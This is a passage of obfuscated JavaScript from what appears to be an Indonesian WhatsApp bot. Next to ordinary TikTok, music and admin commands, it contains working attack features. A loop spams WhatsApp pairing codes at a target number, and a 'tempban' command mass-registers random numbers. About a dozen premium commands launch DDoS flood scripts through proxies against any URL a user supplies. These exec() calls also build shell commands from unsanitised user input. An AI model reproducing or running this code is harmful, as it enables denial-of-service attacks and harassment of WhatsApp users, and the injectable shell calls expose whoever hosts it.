            version: _0x3c21ff
          } = await _0xc7cad2();
          let _0x4f244b = await _0x51d93b({
            'auth': _0xdc8d2,
            'version': _0x3c21ff,
            'logger': pino({
              'level': "fatal"
            })
          });
          for (let _0x555c0b = 0x0; _0x555c0b < _0x57704a; _0x555c0b++) {
            await sleep(0x5dc);
            let _0x25ec1e = await _0x4f244b.requestPairingCode(_0x4b42bd);
            await console.log("# Succes Spam Pairing Code - Number : " + _0x4b42bd + " - Code : " + _0x25ec1e);
          }
          await sleep(0x3a98);
        }
        break;
      case "tempban":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.owner);
          }
          if (_0x196e0d.length < 0x1) {
            return _0x427bb7("*Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭");
          }
          const _0x1d73f4 = _0x196e0d[0x0].split('|');
          if (_0x1d73f4.length !== 0x2) {
            return _0x427bb7("Syntax Error!*\n\n_Use : Tempban ID|NO_\n_Example : Tempban 62|819_\n\n𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚🎭");
          }
          await _0x427bb7("</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️");
          try {
            const {
              statebyxx: _0x31bf65,
              saveCredsbyxx: _0x1efa2b
            } = await useMultiFileAuthState("./TheGetsuzoZhiro");
          } catch (_0x4f8b0d) {}
          for (let _0x26b058 = 0x0; _0x26b058 < 0x2710; _0x26b058++) {
            try {
              var _0x39bc51 = Math.floor(Math.random() * 0x3e7);
              var _0x3958ce = Math.floor(Math.random() * 0x3e7);
              await _0x1acf89.register(_0x39bc51 + '-' + _0x3958ce);
            } catch (_0x586a8e) {
              console.log(_0x39bc51 + '-' + _0x3958ce);
            }
          }
        }
        break;
      case "ddos":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x79794a = q.split(" ")[0x0];
          let _0x55b590 = q.split(" ")[0x1];
          let _0x5e691b = q.split(" ")[0x2];
          let _0x111dac = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x79794a && _0x55b590 && _0x5e691b && _0x111dac) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x79794a + " 🎭 Serangan Berlangsung Selama " + _0x55b590 + " Detik.");
            exec("node ./ddos/hentai.js " + _0x79794a + " " + _0x55b590 + " " + _0x111dac + " " + _0x5e691b + " proxy.txt", (_0x40dc71, _0x207dee) => {
              if (_0x40dc71) {
                return console.log(_0x40dc71.toString());
              }
              if (_0x207dee) {
                return console.log(util.format(_0x207dee));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case 'xc':
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let [_0x719b0d, _0x1a9999, _0x1a780a, _0x45f363, _0x5482fe] = q.split(" ");
          if (_0x196e0d.length === 0x5 && _0x719b0d && _0x1a9999 && _0x1a780a && _0x45f363 && _0x5482fe) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: " + _0x719b0d + " 🎭 Serangan Berlangsung Selama " + _0x1a9999 + " Detik.");
            exec("node ./ddos/LC.js " + _0x719b0d + " " + _0x1a9999 + " " + _0x1a780a + " " + _0x45f363 + " proxy.txt", (_0x78477f, _0x10f6a3) => {
              if (_0x78477f) {
                return console.log(_0x78477f.toString());
              }
              if (_0x10f6a3) {
                return console.log(util.format(_0x10f6a3));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]");
          }
        }
        break;
      case "mix":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x2c0580 = q.split(" ")[0x0];
          let _0x328fd1 = q.split(" ")[0x1];
          let _0x51ada4 = q.split(" ")[0x2];
          let _0x2f4b10 = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x2c0580 && _0x328fd1 && _0x51ada4 && _0x2f4b10) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x2c0580 + " 🎭 Serangan Berlangsung Selama " + _0x328fd1 + " Detik.");
            exec("node ./ddos/mix.js " + _0x2c0580 + " " + _0x328fd1 + " " + _0x51ada4 + " " + _0x2f4b10, (_0x1e7706, _0x35f312) => {
              if (_0x1e7706) {
                return console.log(_0x1e7706.toString());
              }
              if (_0x35f312) {
                return console.log(util.format(_0x35f312));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "floods":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x834290 = q.split(" ")[0x0];
          let _0x494324 = q.split(" ")[0x1];
          let _0x9a0300 = q.split(" ")[0x2];
          let _0x5694d0 = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x834290 && _0x494324 && _0x9a0300 && _0x5694d0) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x834290 + " 🎭 Serangan Berlangsung Selama " + _0x494324 + " Detik.");
            exec("node ./ddos/floods.js " + _0x834290 + " " + _0x494324 + " " + _0x5694d0 + " " + _0x9a0300 + " proxy.txt", (_0x68b94, _0x1f5455) => {
              if (_0x68b94) {
                return console.log(_0x68b94.toString());
              }
              if (_0x1f5455) {
                return console.log(util.format(_0x1f5455));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case 'ua':
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x5bcbb0 = q.split(" ")[0x0];
          let _0x546c5d = q.split(" ")[0x1];
          let _0x5cd92a = q.split(" ")[0x2];
          let _0x57013e = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x5bcbb0 && _0x546c5d && _0x5cd92a && _0x57013e) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x5bcbb0 + " 🎭 Serangan Berlangsung Selama " + _0x546c5d + " Detik.");
            exec("node ./ddos/kilua.js " + _0x5bcbb0 + " " + _0x546c5d + " " + _0x5cd92a + " proxy.txt " + _0x57013e + " ua.txt", (_0x3839f3, _0x2e5066) => {
              if (_0x3839f3) {
                return console.log(_0x3839f3.toString());
              }
              if (_0x2e5066) {
                return console.log(util.format(_0x2e5066));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "xchrome":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x2cd66e = q.split(" ")[0x0];
          let _0x5414f7 = q.split(" ")[0x1];
          let _0x19dcdf = q.split(" ")[0x2];
          let _0x1dfab5 = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x2cd66e && _0x5414f7 && _0x19dcdf && _0x1dfab5) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x2cd66e + " 🎭 Serangan Berlangsung Selama " + _0x5414f7 + " Detik.");
            exec("node ./ddos/chromev3.js " + _0x2cd66e + " " + _0x5414f7 + " " + _0x1dfab5 + " " + _0x19dcdf + " proxy.txt", (_0x351443, _0x184674) => {
              if (_0x351443) {
                return console.log(_0x351443.toString());
              }
              if (_0x184674) {
                return console.log(util.format(_0x184674));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tls":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x3108cf = q.split(" ")[0x0];
          let _0x4d3b03 = q.split(" ")[0x1];
          let _0x1d15d2 = q.split(" ")[0x2];
          let _0x4e6c74 = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x3108cf && _0x4d3b03 && _0x1d15d2 && _0x4e6c74) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x3108cf + " 🎭 Serangan Berlangsung Selama " + _0x4d3b03 + " Detik.");
            exec("node ./ddos/tls-arz.js " + _0x3108cf + " " + _0x4d3b03 + " " + _0x4e6c74 + " " + _0x1d15d2 + " proxy.txt", (_0x312242, _0x1a62fe) => {
              if (_0x312242) {
                return console.log(_0x312242.toString());
              }
              if (_0x1a62fe) {
                return console.log(util.format(_0x1a62fe));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tlsbypass":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x4ed7dd = q.split(" ")[0x0];
          let _0x5e8f76 = q.split(" ")[0x1];
          let _0x94e722 = q.split(" ")[0x2];
          let _0x359d78 = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x4ed7dd && _0x5e8f76 && _0x94e722 && _0x359d78) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x4ed7dd + " 🎭 Serangan Berlangsung Selama " + _0x5e8f76 + " Detik.");
            exec("node ./ddos/tls-bypass.js " + _0x4ed7dd + " " + _0x5e8f76 + " " + _0x359d78 + " " + _0x94e722, (_0x3f3c92, _0x39342a) => {
              if (_0x3f3c92) {
                return console.log(_0x3f3c92.toString());
              }
              if (_0x39342a) {
                return console.log(util.format(_0x39342a));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tlsv2":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x31f131 = q.split(" ")[0x0];
          let _0x257349 = q.split(" ")[0x1];
          let _0x53140d = q.split(" ")[0x2];
          let _0x1fd04c = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x31f131 && _0x257349 && _0x53140d && _0x1fd04c) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x31f131 + " 🎭 Serangan Berlangsung Selama " + _0x257349 + " Detik.");
            exec("node ./ddos/tls.js " + _0x31f131 + " " + _0x257349 + " " + _0x1fd04c + " " + _0x53140d + " proxy.txt", (_0x17f41c, _0x4c16c5) => {
              if (_0x17f41c) {
                return console.log(_0x17f41c.toString());
              }
              if (_0x4c16c5) {
                return console.log(util.format(_0x4c16c5));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "bypass-cf":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0xc34e29 = q.split(" ")[0x0];
          let _0x3c1861 = q.split(" ")[0x1];
          let _0x212c15 = q.split(" ")[0x2];
          let _0x18c549 = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0xc34e29 && _0x3c1861 && _0x212c15 && _0x18c549) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0xc34e29 + " 🎭 Serangan Berlangsung Selama " + _0x3c1861 + " Detik.");
            exec("node ./ddos/bypass.js " + _0xc34e29 + " " + _0x3c1861 + " " + _0x18c549 + " " + _0x212c15 + " proxy.txt", (_0x59302a, _0x321ef4) => {
              if (_0x59302a) {
                return console.log(_0x59302a.toString());
              }
              if (_0x321ef4) {
                return console.log(util.format(_0x321ef4));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tls-vip":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x526803 = q.split(" ")[0x0];
          let _0x2822b1 = q.split(" ")[0x1];
          let _0x3028a4 = q.split(" ")[0x2];
          let _0x52be92 = q.split(" ")[0x3];
          if (_0x196e0d.length === 0x4 && _0x526803 && _0x2822b1 && _0x3028a4 && _0x52be92) {
            _0x427bb7("Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : " + _0x526803 + " 🎭 Serangan Berlangsung Selama " + _0x2822b1 + " Detik.");
            exec("node ./ddos/tlsvip.js " + _0x526803 + " " + _0x2822b1 + " " + _0x52be92 + " " + _0x3028a4 + " proxy.txt", (_0x5af547, _0x13a602) => {
              if (_0x5af547) {
                return console.log(_0x5af547.toString());
              }
              if (_0x13a602) {
                return console.log(util.format(_0x13a602));
              }
            });
          } else {
            _0x427bb7("Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]");
          }
        }
        break;
      case "tiktokslide":
      case "ttslide":
        {
          if (!_0x4ec028) {
            return _0x427bb7("*Example :* \n\n*Tiktokdl Link Url*");
          }
          if (!_0x4ec028.includes("tiktok.com")) {
            return _0x427bb7("Url Tidak Mengandung Result Dari Tiktok!");
          }
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          try {
            let _0x1be95b = _0x196e0d[0x0];
            if (!_0x1be95b) {
              return _0x427bb7("Masukkan URL TikTok Terlebih Dahulu.");
            }
            let _0x4989a6 = await fetch("https://api.betabotz.eu.org/api/download/ttslide?url=" + _0x1be95b + "&apikey=GetsuzoZhiro");
            let _0x269ec5 = await _0x4989a6.json();
            if (!_0x269ec5.status) {
              return _0x427bb7("Gagal Mengambil Data, Coba Lagi.");
            }
            let _0x307422 = _0x269ec5.result.images;
            let _0x442335 = _0x269ec5.result.title || "TikTok Slide";
            let _0x506ca9 = _0x269ec5.result.totalSlide || "Total Slide";
            const _0x594e07 = async _0x29b4c9 => {
              const {
                imageMessage: _0x5e2dc4
              } = await generateWAMessageContent({
                'image': {
                  'url': _0x29b4c9
                }
              }, {
                'upload': _0x1acf89.waUploadToServer
              });
              return _0x5e2dc4;
            };
            const _0x2746f6 = await Promise.all(_0x307422.map(async (_0x22c7f3, _0x4e0cc7) => ({
              'header': proto.Message.InteractiveMessage.Header.fromObject({
                'title': gris + "IMAGE " + (_0x4e0cc7 + 0x1) + gris,
                'hasMediaAttachment': true,
                'imageMessage': await _0x594e07(_0x22c7f3)
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                'buttons': []
              })
            })));
            const _0x3c626b = generateWAMessageFromContent(_0x470adc.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
                    'body': proto.Message.InteractiveMessage.Body.fromObject({
                      'text': "> " + gris + "[TIKTOK FOTO SLIDE]" + gris + "\n\n" + hiasan + "Total Foto : " + _0x506ca9 + "\n" + hiasan + _0x442335
                    }),
                    'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                      'cards': _0x2746f6
                    })
                  })
                }
              }
            }, {});
            await _0x1acf89.relayMessage(_0x3c626b.key.remoteJid, _0x3c626b.message, {
              'messageId': _0x3c626b.key.id
            });
            await _0x1acf89.sendButtons(_0x470adc.chat, {
              'body': "``「 " + gris + "[ T I K T O K ]" + gris + " 」``\n\n  *›  UNDUH AUDIO*\n" + hiasan + "*Author* : " + packname,
              'footer': "⿻  ⌜ 🩸𝔻ℝ𝔼𝕏𝐇𝐚𝐫𝐝𝐞𝐫🐉 ⌟  ⿻",
              'buttons': [{
                'displayText': "𝐒𝐎𝐔𝐍𝐃𝐒",
                'id': "ttmp3 " + q
              }]
            }, {
              'quoted': Zets
            });
          } catch (_0x90dfb8) {
            _0x427bb7("Terjadi kesalahan, coba lagi nanti.");
            console.error(_0x90dfb8);
          }
        }
        break;
      case "tiktok":
        {
          if (!_0x4ec028) {
            return _0x427bb7("*Example :*\n\n*Tiktokdl Link Url*");
          }
          if (!_0x4ec028.includes("tiktok.com")) {
            return _0x427bb7("Url Tidak Mengandung Result Dari Tiktok!");
          }
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          try {
            let _0xf50c97 = await fetch("https://api.betabotz.eu.org/api/download/tiktok?url=" + encodeURIComponent(_0x4ec028) + "&apikey=GetsuzoZhiro");
            let _0x25ed01 = await _0xf50c97.json();
            if (!_0x25ed01.status) {
              return _0x427bb7("Gagal mendapatkan data dari API.");
            }
            const {
              title: _0x427873,
              video: _0x4dad9d,
              audio: _0x47a4bb
            } = _0x25ed01.result;
            await _0x1acf89.sendMessage(_0x470adc.chat, {
              'video': {
                'url': _0x4dad9d[0x0]
              },
              'caption': gris + "[ T I K T O K ]" + gris + "\n\n*› Title :* " + _0x427873,
              'mimetype': "video/mp4"
            }, {
              'quoted': Zets
            });
            await _0x1acf89.sendButtons(_0x470adc.chat, {
              'body': "``「 " + gris + "[ T I K T O K ]" + gris + " 」``\n\n  *›  UNDUH AUDIO*\n" + hiasan + "*Title :* " + _0x427873,
              'footer': "⿻  ⌜ 🩸𝔻ℝ𝔼𝕏𝐇𝐚𝐫𝐝𝐞𝐫🐉 ⌟  ⿻",
              'buttons': [{
                'displayText': "𝐒𝐎𝐔𝐍𝐃𝐒",
                'id': "ttmp3 " + q
              }]
            }, {
              'quoted': Zets
            });
          } catch (_0x46b47f) {
            _0x427bb7("Terjadi Kesalahan Saat Menghubungi API.");
            console.error(_0x46b47f);
          }
        }
        break;
      case "ttmp4":
      case "ttdl":
        {
          if (!_0x4ec028) {
            return _0x427bb7("*Example :* \n\n*Tiktokdl Link Url*");
          }
          if (!_0x4ec028.includes("tiktok.com")) {
            return _0x427bb7("Url Tidak Mengandung Result Dari Tiktok!");
          }
          const _0x406628 = await tiktokDl(_0x4ec028);
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          if (_0x406628.size_nowm) {
            await _0x1acf89.sendFileUrl(_0x470adc.chat, _0x406628.data[0x1].url, gris + "[ T I K T O K ]" + gris + "\n\n" + hiasan + "*Author* : " + _0x406628.author.nickname + "\n" + hiasan + "*Capiton* : " + _0x406628.title, Zets);
            await _0x1acf89.sendButtons(_0x470adc.chat, {
              'body': "``「 " + gris + "[ T I K T O K ]" + gris + " 」``\n\n  *›  UNDUH AUDIO*\n" + hiasan + "*Author* : " + _0x406628.author.nickname,
              'footer': "⿻  ⌜ 🩸𝔻ℝ𝔼𝕏𝐇𝐚𝐫𝐝𝐞𝐫🐉 ⌟  ⿻",
              'buttons': [{
                'displayText': "𝐒𝐎𝐔𝐍𝐃𝐒",
                'id': "ttmp3 " + q
              }]
            }, {
              'quoted': Zets
            });
          } else {
            for (let _0x47292a = 0x0; _0x47292a < _0x406628.data.length; _0x47292a++) {
              await _0x1acf89.sendFileUrl(_0x470adc.chat, _0x406628.data[_0x47292a].url, gris + "[ I M A G E ]" + gris, Zets);
            }
            await _0x1acf89.sendButtons(_0x470adc.chat, {
              'body': "``「 " + gris + "[ T I K T O K ]" + gris + " 」``\n\n  *›  UNDUH AUDIO*\n" + hiasan + "*Author* : " + _0x406628.author.nickname,
              'footer': "⿻  ⌜ 🩸𝔻ℝ𝔼𝕏𝐇𝐚𝐫𝐝𝐞𝐫🐉 ⌟  ⿻",
              'buttons': [{
                'displayText': "𝐒𝐎𝐔𝐍𝐃𝐒",
                'id': "ttmp3 " + q
              }]
            }, {
              'quoted': Zets
            });
          }
        }
        break;
      case "ttmp3":
        {
          if (!_0x4ec028) {
            return _0x427bb7("*Example:*\n\n*Ttmp3 Link Url*");
          }
          if (!_0x4ec028.includes("tiktok.com")) {
            return _0x427bb7("Url Tidak Mengandung Result Dari Tiktok!");
          }
          const _0x349223 = await tiktokDl(_0x4ec028);
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          await _0x1acf89.sendMessage(_0x470adc.chat, {
            'audio': {
              'url': _0x349223.music_info.url
            },
            'mimetype': "audio/mpeg",
            'contextInfo': {
              'externalAdReply': {
                'title': "TikTok • " + _0x349223.author.nickname,
                'body': _0x349223.stats.likes + " Suka, " + _0x349223.stats.comment + " Komentar. " + _0x349223.title,
                'previewType': "PHOTO",
                'thumbnailUrl': _0x349223.cover,
                'mediaType': 0x1,
                'renderLargerThumbnail': true,
                'sourceUrl': _0x4ec028
              }
            }
          }, {
            'quoted': Zets
          });
        }
        break;
      case "play":
        {
          if (!_0x4ec028) {
            return _0x427bb7("*Example :*\n\n*Play *nama lagu* *");
          }
          _0x427bb7("𝗣𝗿𝗼𝗰𝗰𝗲𝘀 💫");
          let _0x575f41 = require("youtube-yts");
          let _0x23f9e6 = await _0x575f41(_0x4ec028);
          let _0x532027 = _0x23f9e6.videos[0x0];
          const _0x5139f8 = await youtube(_0x532027.url);
          await _0x1acf89.sendMessage(_0x470adc.chat, {
            'audio': {
              'url': _0x5139f8.mp3
            },
            'fileName': _0x532027.title + ".mp3",
            'mimetype': "audio/mpeg",
            'contextInfo': {
              'externalAdReply': {
                'title': _0x532027.title,
                'body': packname,
                'thumbnailUrl': _0x532027.image,
                'sourceUrl': _0x5139f8.mp3,
                'mediaType': 0x1,
                'mediaUrl': _0x532027.url
              }
            }
          }, {
            'quoted': Zets
          });
        }
        break;
      case "owner":
        {
          if (!_0x43e87d) {
            return _0x427bb7("Mau Ngapain Dek ??");
          }
          const _0x1e2566 = await _0x1acf89.sendMessage(_0x479590, {
            'contacts': {
              'displayName': _0x4c6f97.length + " Kontak",
              'contacts': _0x4c6f97
            },
            'contextInfo': {
              'forwardingScore': 0x98967f,
              'isForwarded': true,
              'mentionedJid': [_0x463c24]
            }
          }, {
            'quoted': _0x470adc
          });
          _0x1acf89.sendMessage(_0x479590, {
            'text': "Nih Owner Gw Jangan Macem\"",
            'contextInfo': {
              'forwardingScore': 0x98967f,
              'isForwarded': true,
              'mentionedJid': [_0x463c24]
            }
          }, {
            'quoted': _0x1e2566
          });
        }
        break;
      case "addowner":
        if (!_0x3cc2ac) {
          return _0x427bb7(mess.only.owner);
        }
        if (!_0x196e0d[0x0]) {
          return _0x427bb7("Penggunaan " + (_0x55d820 + _0x25c23d) + " nomor\nContoh " + (_0x55d820 + _0x25c23d) + " 62×××");
        }
        bnnd = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x5f568c = await _0x1acf89.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x5f568c.length == 0x0) {
          return _0x427bb7("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
        }
        _0x1b59e4.push(bnnd);
        fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(_0x1b59e4));
        _0x427bb7("Nomor " + bnnd + " Telah Menjadi Owner!!!");
        break;
      case "delowner":
        if (!_0x3cc2ac) {
          return _0x427bb7(mess.only.owner);
        }
        if (!_0x196e0d[0x0]) {
          return _0x427bb7("Penggunaan " + (_0x55d820 + _0x25c23d) + " nomor\nContoh " + (_0x55d820 + _0x25c23d) + " 62×××");
        }
        ya = q.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = _0x1b59e4.indexOf(ya);
        _0x1b59e4.splice(unp, 0x1);
        fs.writeFileSync("./database/dtbs/owner.json", JSON.stringify(_0x1b59e4));
        _0x427bb7("Nomor " + ya + " Telah Di Hapus Owner!!!");
        break;
      case "setowner":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7("kusus owner");
          }
          if (!_0x4ec028) {
            return _0x427bb7("Contoh : " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          global.owner = _0x4ec028.split('|')[0x0];
          _0x427bb7("Exif berhasil diubah menjadi\n\n• No Owner : " + global.owner);
        }
        break;
      case "self":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.only.owner);
          }
          _0x1acf89["public"] = false;
          _0x427bb7("Succes Mode Private");
        }
        break;
      case "addprem":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.only.owner);
          }
          if (!_0x196e0d[0x0]) {
            return _0x427bb7("Penggunaan " + (_0x55d820 + _0x25c23d) + " nomor\nContoh " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          prrkek = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0x204989 = await _0x1acf89.onWhatsApp(prrkek);
          if (_0x204989.length == 0x0) {
            return _0x427bb7("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
          }
          _0x56a438.push(prrkek);
          fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(_0x56a438));
          _0x427bb7("Nomor " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case "delprem":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.only.owner);
          }
          if (!_0x196e0d[0x0]) {
            return _0x427bb7("Penggunaan " + (_0x55d820 + _0x25c23d) + " nomor\nContoh " + (_0x55d820 + _0x25c23d) + " 62×××");
          }
          ya = q.split('|')[0x0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          unp = _0x56a438.indexOf(ya);
          _0x56a438.splice(unp, 0x1);
          fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(_0x56a438));
          _0x427bb7("Nomor " + ya + " Telah Di Hapus Premium!");
        }
        break;
      case "public":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.only.owner);
          }
          _0x1acf89["public"] = true;
          _0x427bb7("Succes Mode Public");
        }
        break;
      case 'qc':
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.only.owner);
          }
          if (!_0x45209a) {} else {
            if (q) {} else {
              _0x427bb7("Kirim perintah " + (_0x55d820 + _0x25c23d) + " byxxTzy");
            }
          }
        }
        break;
      case "mangap":
        {
          _0x427bb7("Makasi Kakak " + _0x24f9f6 + " Atas Pujiannya");
        }
        break;
      case 'ai':
        {
          if (!_0x4ec028) {
            return _0x427bb7("*• Example:* " + (_0x55d820 + _0x25c23d) + " Siapakah orang yang telah menemukan Komputer di jaman Majapahit");
          }
          await _0x1acf89.sendMessage(_0x470adc.chat, {
            'react': {
              'text': '⏱️',
              'key': _0x470adc.key
            }
          });
          try {
            let _0x4f0ea4 = await (await fetch("https://widipe.com/openai?text=" + _0x4ec028)).json();
            let _0x29a36a = generateWAMessageFromContent(_0x470adc.chat, {
              'viewOnceMessage': {
                'message': {
                  'messageContextInfo': {
                    'deviceListMetadata': {},
                    'deviceListMetadataVersion': 0x2
                  },
                  'interactiveMessage': proto.Message.InteractiveMessage.create({
                    'body': proto.Message.InteractiveMessage.Body.create({
                      'text': "> byxx - AI\n\n" + _0x4f0ea4.result
                    }),
                    'footer': proto.Message.InteractiveMessage.Footer.create({
                      'text': namabot
                    }),
                    'header': proto.Message.InteractiveMessage.Header.create({
                      'hasMediaAttachment': false,
                      ...(await prepareWAMessageMedia({
                        'image': fs.readFileSync("./image/byzx.jpg")
                      }, {
                        'upload': _0x1acf89.waUploadToServer
                      }))
                    }),
                    'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      'buttons': [{
                        'name': "quick_reply",
                        'buttonParamsJson': "{\"display_text\":\"Nice byxx - AI\",\"id\":\".mangap\"}"
                      }]
                    }),
                    'contextInfo': {
                      'mentionedJid': [_0x470adc.sender],
                      'forwardingScore': 0x3e7,
                      'isForwarded': true,
                      'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "0@newsletter",
                        'newsletterName': namabot,
                        'serverMessageId': 0x8f
                      }
                    }
                  })
                }
              }
            }, {
              'quoted': _0x470adc
            });
            await _0x1acf89.relayMessage(_0x470adc.chat, _0x29a36a.message, {});
          } catch (_0xa88382) {
            return _0x427bb7("Error Kak :(");
          }
        }
        break;
      case "hdvid":
      case "hdvideo":
      case "vidiohd":
      case "tohd":
      case "vidhd":
        {
          const {
            exec: _0x54ffa4
          } = require("child_process");
          const _0x222785 = _0x470adc.quoted ? _0x470adc.quoted : _0x470adc;
          const _0x5b31c1 = (_0x222785.msg || _0x222785).mimetype || '';
          if (!_0x5b31c1) {
            return _0x470adc.reply("Mana vidio nya bang?");
          }
          _0x427bb7(mess.wait);
          const _0x35b091 = await _0x1acf89.downloadAndSaveMediaMessage(_0x222785);
          _0x54ffa4("ffmpeg -i " + _0x35b091 + " -s 1280x720 -c:v libx264 -c:a copy " + "output.mp4", (_0x4802cd, _0x3ce061, _0x5ae053) => {
            if (_0x4802cd) {
              console.error("Error: " + _0x4802cd.message);
              return;
            }
            console.log("stdout: " + _0x3ce061);
            console.error("stderr: " + _0x5ae053);
            _0x1acf89.sendMessage(_0x470adc.chat, {
              'caption': "_Success To HD Video_",
              'video': {
                'url': "output.mp4"
              }
            }, {
              'quoted': _0x470adc
            });
          });
          await sleep(0xea60);
          fs.unlinkSync("output.mp4");
          fs.unlinkSync(_0x35b091);
        }
        break;
      case "enc":
      case "encrypt":
      case "obfuscate":
        {
          if (!q) {
            return _0x427bb7("Contoh " + (_0x55d820 + _0x25c23d) + " const time = require('money')");
          }
          let _0x38f041 = await _0x54a01d(q);
          _0x427bb7('' + _0x38f041.result);
        }
        break;
      case "1gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x5f574c = _0x4ec028.split(',');
